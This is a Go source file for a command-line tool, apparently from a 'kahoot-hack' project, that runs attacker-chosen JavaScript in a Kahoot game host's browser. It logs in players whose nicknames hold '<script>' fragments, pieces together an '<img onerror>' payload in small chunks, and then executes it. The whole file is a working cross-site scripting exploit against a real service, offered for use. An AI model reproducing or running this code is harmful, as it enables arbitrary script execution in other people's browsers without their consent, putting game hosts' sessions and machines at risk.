package main

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/unixpickle/kahoot-hack/kahoot"
)

var wg sync.WaitGroup

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintln(os.Stderr, "Usage: xss <game pin> <script>")
		os.Exit(1)
	}
	gamePin := os.Args[1]

	elementText := `<img src="" onerror="` + escapeScript(os.Args[2]) + `">`

	uploadInjectionString(gamePin, elementText)
	d1, d2 := computeDelays(1)
	if err := runShortScript(gamePin, "$(Z)", d1, d2); err != nil {
		fmt.Fprintln(os.Stderr, "Failed to execute code:", err)
		os.Exit(1)
	}
}

func uploadInjectionString(gamePin string, inject string) {
	d1, d2 := computeDelays(1)
	if err := runShortScript(gamePin, "Z=''", d1, d2); err != nil {
		fmt.Fprintln(os.Stderr, "Initial script failed:", err)
		os.Exit(1)
	}
	for i := 0; i < len(inject); i += 32 {
		if i+32 >= len(inject) {
			uploadNextChunk(gamePin, inject[i:])
		} else {
			uploadNextChunk(gamePin, inject[i:i+32])
		}
	}
}

func uploadNextChunk(gamePin string, chunk string) {
	// This makes uploading a chunk take logarithmic time instead of linear time. Much faster.
	var wg sync.WaitGroup
	d1, d2 := computeDelays(32)
	for i := 0; i < 32; i++ {
		var ch byte
		if i < len(chunk) {
			ch = chunk[i]
		}
		wg.Add(1)
		go func(i int, ch byte) {
			defer wg.Done()
			var err error
			if ch == 0 {
				err = runShortScript(gamePin, nthVariableName(i)+"=''", d1, d2)
			} else if ch == '\'' {
				err = runShortScript(gamePin, nthVariableName(i)+`="'"`, d1, d2)
			} else {
				err = runShortScript(gamePin, nthVariableName(i)+"='"+string(ch)+"'", d1, d2)
			}
			if err != nil {
				fmt.Fprintln(os.Stderr, "Error uploading character:", err)
				os.Exit(1)
			}
		}(i, ch)
	}
	wg.Wait()
	for i := 16; i >= 1; i /= 2 {
		d1, d2 = computeDelays(i)
		var destStart int
		var sourceStart int
		if i == 16 || i == 4 || i == 1 {
			destStart = 32
			sourceStart = 0
		} else {
			destStart = 0
			sourceStart = 32
		}
		for j := 0; j < i; j++ {
			wg.Add(1)
			go func(j int) {
				defer wg.Done()
				x := j * 2
				err := runShortScript(gamePin, nthVariableName(destStart+j)+"="+
					nthVariableName(sourceStart+x)+"+"+
					nthVariableName(sourceStart+x+1)+"", d1, d2)
				if err != nil {
					fmt.Fprintln(os.Stderr, "Error folding strings:", err)
					os.Exit(1)
				}
			}(j)
		}
		wg.Wait()
	}
	if err := runShortScript(gamePin, "Z+="+nthVariableName(32), d1, d2); err != nil {
		fmt.Fprintln(os.Stderr, "Error finishing off chunk:", err)
		os.Exit(1)
	}
}

func escapeScript(script string) string {
	script = strings.Replace(script, "\"", "&quot;", -1)
	return script
}

func runShortScript(gamePin string, script string, delay1, delay2 time.Duration) error {
	conn, err := kahoot.NewConn(gamePin)
	if err != nil {
		return err
	}

	if err := conn.Login("<script>" + script + "//"); err != nil {
		conn.GracefulClose()
		return err
	}

	time.Sleep(delay1)
	conn.GracefulClose()
	time.Sleep(delay2)

	return nil
}

// computeDelays figures out about how much time it will take for the
// kahoot host to register and execute a certain number of simultaneous
// script executions.
//
// I tested these times on a POS chromebook and they were still more than enough.
// To be fair, though, my internet was pretty fast at the time.
func computeDelays(numSimul int) (delay1, delay2 time.Duration) {
	if numSimul == 1 {
		delay1 = time.Second / 2
		delay2 = time.Second / 2
		return
	} else if numSimul <= 4 {
		delay1 = time.Second
	} else if numSimul <= 8 {
		delay1 = time.Second + time.Millisecond*500
	} else {
		delay1 = time.Second * 2
	}
	delay2 = delay1 / 2
	return
}

func nthVariableName(n int) string {
	// TODO: support unicode variable names for ultimate hacks.
	if n < 26 {
		return string('a' + rune(n))
	} else {
		return string('A' + rune(n-26))
	}
}
